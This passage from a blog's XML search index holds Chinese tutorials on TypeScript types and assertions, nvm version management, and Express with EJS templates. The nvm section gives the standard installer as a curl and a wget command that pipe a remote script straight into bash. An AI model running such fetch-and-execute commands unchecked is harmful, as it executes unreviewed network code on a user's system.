operator">|</span> <span class="token string">'POST'</span><span class="token punctuation">;</span>        credentials<span class="token operator">?</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span>        headers<span class="token operator">?</span><span class="token punctuation">:</span> any<span class="token punctuation">;</span>        <span class="token punctuation">[</span>params<span class="token punctuation">:</span> string<span class="token punctuation">]</span><span class="token punctuation">:</span> any<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> options<span class="token punctuation">:</span> fetchSetting<span class="token punctuation">.</span>fetchOptions <span class="token operator">=</span> <span class="token punctuation">{</span>    method<span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>    credentials<span class="token punctuation">:</span> <span class="token string">'include'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nvm版本管理</title>
      <link href="2019/09/04/nvm/"/>
      <url>2019/09/04/nvm/</url>
      
        <content type="html"><![CDATA[<h2 id="安装nvm"><a href="#安装nvm" class="headerlink" title="安装nvm"></a>安装nvm</h2><p>首先要安装或者更新nvm，可以使用cURL 使用<a href="https://github.com/creationix/nvm/blob/v0.34.0/install.sh" target="_blank" rel="noopener">安装脚本</a></p><pre class="line-numbers language-js"><code class="language-js">curl <span class="token operator">-</span>o<span class="token operator">-</span> https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com<span class="token operator">/</span>creationix<span class="token operator">/</span>nvm<span class="token operator">/</span>v0<span class="token number">.34</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token operator">/</span>install<span class="token punctuation">.</span>sh <span class="token operator">|</span> bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者 wget</p><pre class="line-numbers language-js"><code class="language-js">wget <span class="token operator">-</span>qO<span class="token operator">-</span> https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com<span class="token operator">/</span>creationix<span class="token operator">/</span>nvm<span class="token operator">/</span>v0<span class="token number">.34</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token operator">/</span>install<span class="token punctuation">.</span>sh <span class="token operator">|</span> bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载并安装完成后用户退出重新登录或者重新 source 一下环境变量</p><pre class="line-numbers language-js"><code class="language-js">$ <span class="token punctuation">.</span> <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h2><p>要验证是否已经安装nvm，执行如下命令：</p><pre class="line-numbers language-js"><code class="language-js">command <span class="token operator">-</span>v nvm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果安装成功，应该输出’nvm’。请注意，这<code>which nvm</code>将无法使用，因为它<code>nvm</code>是一个源shell函数，而不是可执行二进制文件。</p><p>注意：</p><ul><li>nvm不支持windows</li><li>如果您正在使用<code>zsh</code>，可以轻松安装<code>nvm</code>为zsh插件。安装<a href="https://github.com/lukechilds/zsh-nvm" target="_blank" rel="noopener"><code>zsh-nvm</code></a>并运行<code>nvm upgrade</code>升级。</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>下载安装最稳定版本</p><pre class="line-numbers language-js"><code class="language-js">nvm install stable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载安装最新版本node</p><pre class="line-numbers language-js"><code class="language-js">nvm install node <span class="token punctuation">(</span>node是最新版本的别名<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载安装指定版本</p><pre class="line-numbers language-js"><code class="language-js">nvm install v8<span class="token number">.10</span><span class="token punctuation">.</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前系统的node版本</p><pre class="line-numbers language-js"><code class="language-js">nvm ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前系统的可用版本</p><pre class="line-numbers language-js"><code class="language-js">nvm ls<span class="token operator">-</span>remote<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用已经安装的某个版本</p><pre class="line-numbers language-js"><code class="language-js">nvm use v8<span class="token number">.10</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token punctuation">(</span>指定的node版本<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用最新版本</p><pre class="line-numbers language-js"><code class="language-js">nvm use node<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前版本</p><pre class="line-numbers language-js"><code class="language-js">nvm current<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除已安装版本</p><pre class="line-numbers language-js"><code class="language-js">nvm uninstall v7<span class="token number">.6</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token punctuation">(</span>指定版本<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置系统用户默认的node版本</p><pre class="line-numbers language-js"><code class="language-js">nvm alias <span class="token keyword">default</span> v7<span class="token number">.6</span><span class="token punctuation">.</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用 nvm 给不同的版本号设置别名</p><pre class="line-numbers language-js"><code class="language-js">我们给 <span class="token number">7.6</span><span class="token punctuation">.</span><span class="token number">0</span> 这个版本号起了一个名字叫做 awesome<span class="token operator">-</span>versionnvm alias awesome<span class="token operator">-</span>version <span class="token number">7.6</span><span class="token punctuation">.</span><span class="token number">0</span>然后我们可以运行：nvm use awesome<span class="token operator">-</span>version下面这个命令可以取消别名：nvm unalias awesome<span class="token operator">-</span>version另外，你还可以设置 <span class="token keyword">default</span> 这个特殊别名：nvm alias <span class="token keyword">default</span> node<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> npm </tag>
            
            <tag> nvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript类型断言</title>
      <link href="2019/09/04/tsAssertion/"/>
      <url>2019/09/04/tsAssertion/</url>
      
        <content type="html"><![CDATA[<h2 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h2><p>类型断言（Type Assertion）可以用来手动指定一个值的类型。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>类型<span class="token operator">></span>值 或者 值 <span class="token keyword">as</span> 类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在 tsx 语法（React 的 jsx 语法的 ts 版）中必须用后一种。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>当 TypeScript 不确定一个联合类型的变量到底是哪个类型的时候，我们只能访问此联合类型的共有属性或者方法 如：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//string和number都有toString方法</span>getLen <span class="token operator">=</span> <span class="token punctuation">(</span>something<span class="token punctuation">:</span> string<span class="token operator">|</span>number<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> something<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//Property 'length' does not exist on type 'ReactText'.</span>  Property <span class="token string">'length'</span> does not exist on type <span class="token string">'number'</span><span class="token punctuation">.</span>getLen <span class="token operator">=</span> <span class="token punctuation">(</span>something<span class="token punctuation">:</span> string<span class="token operator">|</span>number<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> something<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而有时候，我们确实需要在还不确定类型的时候就访问其中一个类型的属性或方法，比如：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//Property 'length' does not exist on type 'ReactText'.</span>  Property <span class="token string">'length'</span> does not exist on type <span class="token string">'number'</span><span class="token punctuation">.</span>getLen <span class="token operator">=</span> <span class="token punctuation">(</span>something<span class="token punctuation">:</span> string<span class="token operator">|</span>number<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>something<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> something<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> something<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时可以使用类型断言，将 <code>something</code> 断言成 <code>string</code>：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//tsx文件中用&lt;>方式报错</span><span class="token comment" spellcheck="true">//Property 'string' does not exist on type 'JSX.IntrinsicElements'.ts(2339)</span><span class="token comment" spellcheck="true">//JSX element 'string' has no corresponding closing tag.</span>getLen <span class="token operator">=</span> <span class="token punctuation">(</span>something<span class="token punctuation">:</span> string<span class="token operator">|</span>number<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>string<span class="token operator">></span>something<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>string<span class="token operator">></span>something<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> something<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>用<span class="token keyword">as</span>方式 相当于js的<span class="token keyword">typeof</span>getLen <span class="token operator">=</span> <span class="token punctuation">(</span>something<span class="token punctuation">:</span> string<span class="token operator">|</span>number<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>something <span class="token keyword">as</span> string<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>something <span class="token keyword">as</span> string<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> something<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node express使用HTML模板</title>
      <link href="2019/09/04/nodehtml/"/>
      <url>2019/09/04/nodehtml/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一般我们在做node web项目的时候，想使用我们平时常用的html模板，express默认使用jade模板，本身是没有HTML的，那么如何实现呢？</p><h2 id="ejs模板配置"><a href="#ejs模板配置" class="headerlink" title="ejs模板配置"></a>ejs模板配置</h2><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置视图引擎</span>app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="html模板配置"><a href="#html模板配置" class="headerlink" title="html模板配置"></a>html模板配置</h2><h3 id="安装ejs"><a href="#安装ejs" class="headerlink" title="安装ejs"></a>安装ejs</h3><pre class="line-numbers language-js"><code class="language-js">npm install ejs <span class="token operator">-</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span> ejs<span class="token punctuation">.</span>__express<span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><h4 id="app-engine-ext-cb"><a href="#app-engine-ext-cb" class="headerlink" title="app.engine(ext, cb)"></a>app.engine(ext, cb)</h4><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__express<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将ejs模板映射至.html文件；  </p><p>上面实际上是调用了ejs的.renderFile()方法，ejs.__express是该方法在ejs内部的另一个名字。  </p><p>因为加载的模板引擎后调用的是同一个方法.__express，所以如果使用的是ejs模板，不用配置该项。  </p><h4 id="app-set-name-value"><a href="#app-set-name-value" class="headerlink" title="app.set(name, value)"></a>app.set(name, value)</h4><p>在.set()方法的参数中，有一项是’view engine’，表示没有指定文件模板格式时，默认使用的引擎插件；  </p><p>如果这里设置为html文件，设置路由指定文件时，只需写文件名，就会找对应的html文件。</p>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript基础讲解</title>
      <link href="2019/09/03/tsBase/"/>
      <url>2019/09/03/tsBase/</url>
      
        <content type="html"><![CDATA[<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="js类型"><a href="#js类型" class="headerlink" title="js类型"></a>js类型</h3><p>JavaScript 的类型分为两种：原始数据类型（<a href="https://developer.mozilla.org/en-US/docs/Glossary/Primitive" target="_blank" rel="noopener">Primitive data types</a>）和对象类型（Object types）。</p><p>原始数据类型包括：布尔值、数值、字符串、<code>null</code>、<code>undefined</code> 以及 <a href="http://es6.ruanyifeng.com/#docs/symbol" target="_blank" rel="noopener">ES6 中的新类型 <code>Symbol</code></a>。</p><p>在JavaScript中undefined，是全局作用于的一个属性，他会赋值给哪些声明但未初始化的变量；</p><p>null是一个字面量（不是全局对象的一个属性），他可以赋值给哪些没有值得变量；</p><h3 id="ts类型"><a href="#ts类型" class="headerlink" title="ts类型"></a>ts类型</h3><p>在TypeScript中我们可以使用undefined和null来定义两个原始类型数据：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> test<span class="token punctuation">:</span> <span class="token keyword">null</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//null</span><span class="token keyword">let</span> test1<span class="token punctuation">:</span> undefined <span class="token operator">=</span> undefined<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>undefined</code> 和 <code>null</code> 是所有类型的子类型。也就是说 <code>undefined</code> 类型的变量，可以赋值给 所有类型的变量 如：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> u1<span class="token punctuation">:</span> undefined<span class="token punctuation">;</span><span class="token keyword">let</span> num1<span class="token punctuation">:</span> number <span class="token operator">=</span> u1<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>而 <code>void</code> 类型的变量不能赋值给 <code>number</code> 类型的变量：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> u<span class="token punctuation">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span><span class="token keyword">let</span> num<span class="token punctuation">:</span> number <span class="token operator">=</span> u<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Type 'void' is not assignable to type 'number'.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h3><p>在 TypeScript 中，数组类型有多种定义方式，比较灵活。</p><p>最简单的方法是使用「类型 + 方括号」来表示数组：</p><p>数组的项中不允许出现其他类型；</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//正确</span><span class="token keyword">let</span> numArray<span class="token punctuation">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">let</span> strArray<span class="token punctuation">:</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Type 'string' is not assignable to type 'number'.</span><span class="token keyword">let</span> numArray<span class="token punctuation">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以使用数组泛型（Array Generic） <code>Array&lt;elemType&gt;</code> 来表示数组：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> objArray<span class="token punctuation">:</span> Array<span class="token operator">&lt;</span>object<span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="任意值any"><a href="#任意值any" class="headerlink" title="任意值any"></a>任意值any</h3><p>任意值（Any）用来表示允许赋值为任意类型。</p><h4 id="any的定义"><a href="#any的定义" class="headerlink" title="any的定义"></a>any的定义</h4><p>如果是普通类型，在赋值过程中是不能改变类型的 如：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> myTest<span class="token punctuation">:</span> string <span class="token operator">=</span> <span class="token string">'test'</span><span class="token punctuation">;</span>myTest <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Type 'true' is not assignable to type 'string'.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果是any，允许被赋值为任意类型</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> myTest<span class="token punctuation">:</span> any <span class="token operator">=</span> <span class="token string">'test'</span><span class="token punctuation">;</span>myTest <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>myTest<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="any的属性"><a href="#any的属性" class="headerlink" title="any的属性"></a>any的属性</h4><p>在任意值上访问任何属性都是允许的：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> anyThing<span class="token punctuation">:</span> any <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>anyThing<span class="token punctuation">.</span>myName<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在声明变量声明是未指定类型，那么就会被识别成任意类型</p><h3 id="类型推论"><a href="#类型推论" class="headerlink" title="类型推论"></a>类型推论</h3><p>如果没有明确的指定类型，那么 TypeScript 会依照类型推论（Type Inference）的规则推断出一个类型。如下：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> myType <span class="token operator">=</span> <span class="token string">'one'</span><span class="token punctuation">;</span>myType <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Type '1' is not assignable to type 'string'.</span>等价于<span class="token keyword">let</span> myType<span class="token punctuation">:</span>string <span class="token operator">=</span> <span class="token string">'one'</span><span class="token punctuation">;</span>myType <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Type '1' is not assignable to type 'string'.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>TypeScript 会在没有明确的指定类型的时候推测出一个类型，这就是类型推论。</p><p>如果定义时没有赋值，不管之后有没有赋值，都会被推断成any类型</p><h2 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h2><p>TypeScript允许声明联合类型。联合类型类声明那些可以存储多种类型的变量</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> myType<span class="token punctuation">:</span> string <span class="token operator">|</span> number<span class="token punctuation">;</span>myType <span class="token operator">=</span> <span class="token string">'one'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//one</span>myType <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//1</span>myType <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Type 'true' is not assignable to type 'ReactText'.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>联合类型使用 <code>|</code> 分隔每个类型。</p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><h3 id="接口基础用法"><a href="#接口基础用法" class="headerlink" title="接口基础用法"></a>接口基础用法</h3><p>在面向对象语言中，接口（Interfaces）是一个很重要的概念，它是对行为的抽象，而具体如何行动需要由类（classes）去实现（implement）。</p><p>TypeScript 中的接口是一个非常灵活的概念，除了可用于<a href>对类的一部分行为进行抽象</a>以外，也常用于对「对象的形状（Shape）」进行描述。</p><p>定义一个变量myJson，类型时Person</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span>string<span class="token punctuation">;</span>    age<span class="token punctuation">:</span> number<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义变量比接口少一些属性</span><span class="token comment" spellcheck="true">//Property 'age' is missing in type '{ name: string; }' but required in type 'Person'.</span><span class="token keyword">let</span> myJson<span class="token punctuation">:</span> Person <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'jerry'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义的变量属性比接口多</span><span class="token comment" spellcheck="true">//Type '{ name: string; age: number; other: string; }' is not assignable to type 'Person'.</span>  Object literal may only specify known properties<span class="token punctuation">,</span> and <span class="token string">'other'</span> does not exist <span class="token keyword">in</span> type <span class="token string">'Person'</span><span class="token punctuation">.</span><span class="token keyword">let</span> myJson<span class="token punctuation">:</span> Person <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'jerry'</span><span class="token punctuation">,</span>    age<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    other<span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="可选属性"><a href="#可选属性" class="headerlink" title="可选属性"></a>可选属性</h3><p>接口里面的属性不全都是必需的，有些只是在某些条件下存在或者根本就不存在。</p><p>可选属性在应用”option bags“模式时很常用，即给函数传入的对象中只有部分属性赋值了</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span>string<span class="token punctuation">;</span>    age<span class="token operator">?</span><span class="token punctuation">:</span> number<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//正常运行</span><span class="token keyword">let</span> myJson<span class="token punctuation">:</span> Person <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'jerry'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可选属性的含义是该属性可以不存在。  </p><p>这时仍然不允许添加未定义的属性。</p><h3 id="任意属性"><a href="#任意属性" class="headerlink" title="任意属性"></a>任意属性</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span>string<span class="token punctuation">;</span>    age<span class="token punctuation">:</span> number<span class="token punctuation">;</span>    <span class="token punctuation">[</span>params<span class="token punctuation">:</span> string<span class="token 